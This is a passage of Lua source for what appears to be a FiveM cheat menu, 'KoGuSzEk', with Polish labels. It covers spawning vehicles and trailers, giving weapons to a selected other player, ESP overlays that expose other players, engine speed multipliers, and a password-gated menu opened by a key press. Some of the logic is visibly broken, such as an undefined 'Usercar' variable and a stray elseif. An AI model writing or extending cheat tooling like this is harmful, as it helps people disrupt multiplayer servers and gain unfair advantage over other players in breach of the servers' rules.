                    if KoGuSzEk.MB('~h~~p~»~w~ ~h~~p~» ~w~' .. e0, 'ModSelect') then
                        dA = ev
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('ModSelect') then
                for _, ev in pairs(dA) do
                    if KoGuSzEk.B(ev.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if KoGuSzEk.MB('~h~~p~»~w~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if KoGuSzEk.MB('~h~~p~»~w~ ~h~~p~»~w~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('CarOptions') then
                if KoGuSzEk.B('~h~~r~Zresp auto') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    pizda(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if KoGuSzEk.MB('~h~~p~»~w~ ~h~~p~»~w~ ' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                    av('~h~~w~Not in a vehicle', true)
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('MainTrailerSpa') then
                if KoGuSzEk.B('~h~~r~Zresp auto') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b5[TrailerToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    pizda(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            local SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('GiveSingleWeaponPlayer') then
                for i = 1, #b6 do
                    if KoGuSzEk.B(b6[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('ESPMenu') then
                if
                    KoGuSzEk.c(
                        '~h~~r~ESP ~w~MasterSwitch',
                        esp,
                        function(dR)
                            esp = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~ESP ~w~Box',
                        espbox,
                        function(dR)
                            espbox = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~ESP ~w~Info',
                        espinfo,
                        function(dR)
                            espinfo = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~ESP ~w~Lines',
                        esplines,
                        function(dR)
                            esplines = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('LSC') then
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if KoGuSzEk.MB('~h~~p~»~w~ ~h~~r~Tuning wykonczenia', 'tunings') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ ~h~~r~Tuning mechaniczny', 'performance') then
                elseif KoGuSzEk.B('~h~Zmien tablice rej.') then
                    cu()
                elseif
                    KoGuSzEk.c(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~wy ~w~Kolor Auta',
                        RainbowVeh,
                        function(dR)
                            RainbowVeh = dR
                        end
                    )
                 then
                elseif KoGuSzEk.B('~h~Ubrudz ~y~auto') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif KoGuSzEk.B('~h~Wyczysc ~g~auto') then
                    Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    KoGuSzEk.c(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~we ~w~Neony & Lampy',
                        rainbowh,
                        function(dR)
                            rainbowh = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('BoostMenu') then
                if
                    KoGuSzEk.ComboBox(
                        '~h~Przyspieszenie silnika',
                        dD,
                        dB,
                        dC,
                        function(ag, ah)
                            dB = ag
                            dC = ah
                            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dC * 20.0)
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~w~Auta ~g~2x',
                        t2x,
                        function(dR)
                            t2x = dR
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~w~Auta ~g~4x',
                        t4x,
                        function(dR)
                            t2x = false
                            t4x = dR
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~w~Auta ~g~10x',
                        t10x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = dR
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~w~Auta ~g~16x',
                        t16x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = dR
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~w~Auta ~y~XD',
                        txd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = dR
                            tbxd = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~w~Auta ~y~BIG XD',
                        tbxd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
           
                elseif IsDisabledControlPressed(0, 315) then
                if logged then
                    KoGuSzEk.OpenMenu("KoGuSzEkV")
                else
                    local temp = KeyboardInput("Wpisz haslo:", "", 100)
                    if triggerr == temp then
                        av("~g~~h~Dobre haslo")
						PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        logged = true
                        KoGuSzEk.OpenMenu("KoGuSzEkV")
                    else
                        TmEM1U()
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)